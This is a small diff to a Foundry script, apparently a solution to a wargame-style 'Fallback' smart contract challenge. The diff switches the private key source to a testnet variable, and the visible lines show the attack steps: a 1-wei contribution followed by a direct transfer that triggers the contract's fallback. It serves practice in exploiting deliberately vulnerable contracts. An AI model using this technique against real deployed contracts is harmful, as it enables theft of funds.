@@ -12,7 +12,7 @@ contract HackFallbackScript is Script {
         Fallback instance = Fallback(
             payable(vm.envAddress("FALLBACK_ADDRESS"))
         );
-        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
+        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
         vm.startBroadcast(deployerKey);
         instance.contribute{value: 1 wei}();
         (bool success, ) = payable(instance).call{value: 1 wei}("");
